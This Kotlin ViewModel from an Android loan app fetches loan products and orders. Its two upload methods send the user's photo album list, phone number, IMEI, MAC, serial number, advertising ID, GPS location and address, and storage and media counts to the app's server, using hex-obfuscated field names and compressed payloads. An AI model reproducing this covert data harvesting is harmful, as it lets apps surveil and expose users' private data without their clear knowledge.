package com.dream.bjst.loan.vm

import android.os.Build
import androidx.annotation.RequiresApi
import com.blankj.utilcode.util.GsonUtils
import com.blankj.utilcode.util.Utils
import com.didichuxing.doraemonkit.util.LocationUtils
import com.dream.bjst.bean.*
import com.dream.bjst.common.UserManager
import com.dream.bjst.identification.bean.IdCardStatusBean
import com.dream.bjst.loan.bean.*
import com.dream.bjst.net.Api
import com.dream.bjst.utils.DeviceUtils
import com.tcl.base.common.BaseViewModel
import com.tcl.base.event.SingleLiveEvent
import com.tcl.base.kt.GZIPCompress
import com.tcl.base.utils.MmkvUtil
import java.io.File

/**
 *@author tiaozi
 *@date   2022/1/26
 *description
 */
class LoanViewModel : BaseViewModel() {
    val loanData = SingleLiveEvent<LoanInfoBean>()
    val loanPreData = SingleLiveEvent<LoanPreBean>()
    val applyData = SingleLiveEvent<ApplyResultBean>()
    val historyData = SingleLiveEvent<OrderResultBean>()
    val userStatus = SingleLiveEvent<IdCardStatusBean>()
    val processOrders = SingleLiveEvent<String>()
    val upDeviceInfo = SingleLiveEvent<Boolean>()

    fun fetchCustomerKycStatus() {
        rxLaunchUI({
            val result = Api.fetchCustomerKycStatus()
            userStatus.postValue(result)
        })
    }

    fun fetchProducts() {
        rxLaunchUI({
            val result = Api.fetchProducts()
            loanData.postValue(result)
        })
    }

    fun fetchCreditAmount() {
        rxLaunchUI({
            val result = Api.fetchCreditAmount()
            loanPreData.postValue(result)
        })
    }

    fun apply(param: String) {
        rxLaunchUI({
            val result = Api.apply(param)
            applyData.postValue(result)
        })
    }

    fun fetchOrderHistory(param: String) {
        rxLaunchUI({
            val result = Api.fetchOrderHistory(param)
            historyData.postValue(result)
        }, showDialog = false)
    }

    fun fetchProcessingOrderCount() {
        rxLaunchUI({
            val result = Api.fetchProcessingOrderCount()
            processOrders.postValue(result)
        }, showDialog = false)
    }

    /**
     * 上传设备信息 （相册信息）
     */
    fun upDevicePhoto() {
        rxLaunchUI({
            val filesEnCrypt = DeviceUtils.getLocalAlbumList(0, 1000)
            val paramBean = DevicePhotoParamBean(
                `9091829D9791BD9A929BAE9D84A78086` = filesEnCrypt,
                `999B969D9891` = UserManager.getUserPhone()
            )
            val result = Api.uploadDeviceAlbumInfo(GsonUtils.toJson(paramBean))
            upDeviceInfo.postValue(result.`869187819880`)
        })
    }

    /**
     * 上传设备信息(基础信息，必须获取的字段已标注)
     */
    fun uploadDeviceBaseInfo() {
        rxLaunchUI({
            val batteryPct = MmkvUtil.decodeString("batteryPct")
            val curLatitude = MmkvUtil.decodeDouble("curLatitude") ?: 0.0
            val curLongitude = MmkvUtil.decodeDouble("curLongitude") ?: 0.0
            val address = LocationUtils.getAddress(curLatitude, curLongitude)
            val paramBean = DeviceBaseInfoBean(
                `9695808091868DA78095808187` = BatteryStatusBean(batteryPct),
                `9091829D9791B29D9891B79A80` = DeviceFileCnt(
                    `9581909D9BB18C8091869A9598` = DeviceUtils.readExternalMusicNum(),
                    `9581909D9BBD9A8091869A9598` = DeviceUtils.readInternalMusicNum(),
                    `909B839A989B9590B29D989187` = DeviceUtils.readInternalVideoNum(),
                    `9D9995939187B18C8091869A9598` = DeviceUtils.readExternalImgNum(),
                    `9D9995939187BD9A8091869A9598` = DeviceUtils.readDownloadNum(),
                    `829D90919BB18C8091869A9598` = DeviceUtils.readExternalVideoNum(),
                    `829D90919BBD9A8091869A9598` = DeviceUtils.readInternalImgNum()
                ),
                `93919A91869598B0958095` = GeneralData(
                    `959A90BD90` = DeviceUtils.getAndroidId(),
                    `909699` = DeviceUtils.getMobileDbm(),
                    `9091829D9791BD90` = DeviceUtils.getDeviceId(),
                    `91989584879190A6919598809D9991` = DeviceUtils.getSystemStartupTime(),
                    `9395BD90` = DeviceUtils.getGAID(),
                    `9D99919D` = DeviceUtils.getIMEI(),
                    `999597` = DeviceUtils.getMac()
                ),
                `9C95869083958691` = HardwareBean(
                    `9686959A90` = DeviceUtils.getDeviceBrand(),
                    `8791869D9598BA8199969186` = DeviceUtils.getSERIAL()
                ),
                `989B9795809D9B9A` = LocationBean(
                    `938487` = GpsBean(curLatitude, curLongitude),
                    `938487B5909086918787A4869B829D9A9791` = address?.adminArea,
                    `938487B5909086918787B79D808D` = address?.locality,
                    `938487B5909086918787B895869391B09D8780869D9780` = address?.subLocality
                ),
                `9A9180839B869F` = WifiConnectBean(DeviceUtils.getAroundWifiNum()),
                `87809B86959391` = StorageBean(
                    `918C8091869A9598A7809B86959391` = Utils.getApp().externalCacheDir?.absolutePath,
                    `9991999B868DB7958690A79D8E91` = DeviceUtils.getSDTotalSize(),
                    `9991999B868DB7958690A79D8E91A18791` = DeviceUtils.getSDTotalSize() - DeviceUtils.getSdAvaliableSize(),
                    `869599A09B809598A79D8E91` = DeviceUtils.getRomTotalSize(),
                    `869599A18795969891A79D8E91` = DeviceUtils.getRomAvailableSize()
                ),
            )
            val result = Api.uploadDeviceBaseInfo(
                GsonUtils.toJson(
                    DeviceBaseParamBean(
                        GsonUtils.toJson(paramBean).GZIPCompress()
                    )
                )
            )
            upDeviceInfo.postValue(result.`869187819880`)
        })
    }
}